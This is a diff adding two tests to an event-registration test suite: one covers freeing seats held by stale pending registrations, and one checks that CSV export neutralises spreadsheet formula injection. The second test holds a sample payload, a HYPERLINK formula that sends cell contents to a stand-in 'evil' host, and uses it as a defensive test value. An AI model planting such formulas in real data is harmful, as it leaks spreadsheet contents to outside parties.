@@ -113,6 +113,28 @@ describe.skipIf(!hasPg)('regDb (Postgres)', () => {
     expect((await getOpenEvent(db, 'en', ev))!.taken_count).toBe(2);
   });
 
+  it('a stale pending row (>1h, dead worker) frees its seat; fresh pending + confirmed still hold', async () => {
+    const ev = await openEvent({ title_en: 'Stale', title_zh: '过期', capacity: 2 });
+    const mk = (name: string, status: 'pending' | 'confirmed') =>
+      createRegistration(db, { eventId: ev, personId: null, name, email: `${name}@x.com`, status, amountCents: 0, currency: 'usd', answers: [] });
+
+    const stale = await mk('Stale', 'pending');
+    // Simulate a worker that died before attachCheckoutSession: the pending row
+    // never got a session id and is now older than the 1h freshness window (well
+    // past Stripe's 30min checkout expiry).
+    await sql.unsafe("UPDATE registrations SET created_at = datetime('now','-2 hours') WHERE id = $1", [stale]);
+    expect((await getOpenEvent(db, 'en', ev))!.taken_count).toBe(0); // stale row freed
+
+    // A fresh pending row and a confirmed row DO hold seats → capacity (2) filled.
+    await mk('Fresh', 'pending');
+    await mk('Conf', 'confirmed');
+    expect((await getOpenEvent(db, 'en', ev))!.taken_count).toBe(2);
+
+    // The backstop counts only live seats, so with 2 held the event is full and a
+    // new registration overflows — the stale row never re-enters the count.
+    await expect(mk('Over', 'pending')).rejects.toThrow('event_full');
+  });
+
   // ── validateAnswers (pure) ───────────────────────────────────────────────────
   it('validateAnswers normalizes every question type and enforces required/options', () => {
     const q = (over: Partial<RegQuestion> & Pick<RegQuestion, 'id' | 'type'>): RegQuestion => ({
@@ -307,5 +329,19 @@ describe.skipIf(!hasPg)('regDb (Postgres)', () => {
     expect(roster[0].name).toBe('Second Reg');
     const first = roster.find((r) => r.name === 'First Reg')!;
     expect(first.answers).toEqual([{ label: 'Comment', value: tricky }]);
+  });
+
+  it('registrationsCsv neutralizes spreadsheet formula injection from anonymous fields', async () => {
+    const ev = await openEvent();
+    // A visitor could submit a formula as their name via the anonymous submit path.
+    await createRegistration(db, {
+      eventId: ev, personId: null, name: '=HYPERLINK("http://evil/?"&A1,"x")', email: 'e@x.com',
+      status: 'confirmed', amountCents: 0, currency: 'usd', answers: [],
+    });
+    const csv = await registrationsCsv(db, 'en', ev);
+    // The dangerous leading '=' is quote-prefixed (then RFC4180-quoted for the
+    // embedded comma/quotes) so Excel/Sheets render it as inert text.
+    expect(csv).toContain("'=HYPERLINK");
+    expect(csv).not.toMatch(/(^|,)=HYPERLINK/); // never a bare formula at cell start
   });
 });
